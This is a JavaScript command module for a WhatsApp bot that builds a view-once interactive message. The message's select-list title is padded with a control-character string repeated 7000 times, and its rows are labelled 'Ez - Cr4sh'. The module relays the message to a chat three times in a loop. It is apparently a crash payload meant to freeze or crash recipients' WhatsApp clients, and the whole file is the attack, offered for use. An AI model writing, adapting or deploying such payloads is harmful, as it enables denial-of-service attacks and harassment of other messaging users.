module.exports = {
    type: 'owner',
    command: 'ryocakep',
    operate: async (context) => {
        const { ryozingod, m, sleep, buglive } = context;
        let penis = '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(7000)
        let msg = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "",
                        },
                        body: {
                            text: "🔥⃟༑𝐂𝐎𝐒𝐓𝐒༑⃟🧐⃟ ⟩ 𝐛𝐲 𝑴𝑨𝑿𝑾𝑬𝑳𝑳⚡☆ >"
                        },
                        footer: {
                            text: "https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: `{"title":"▾ 𝑴𝑨𝑿𝑾𝑬𝑳𝑳-𝑴𝑫⚡ ▾","sections":[{"title":"🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑ #${penis}","rows":[{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"},{"header":"#zxv_vision","title":"Ez - Cr4sh","id":"#zxv_vision"}]}]}`
                                }
                            ],
                            messageParamsJson: ""
                        }
                    }
                }
            }
        };

        for (let j = 0; j < 3; j++) {
            await ryozingod.relayMessage(m.chat, msg, {})
            await ngeloc(m.chat, m)
            await sleep(1000)
        }
    }
}
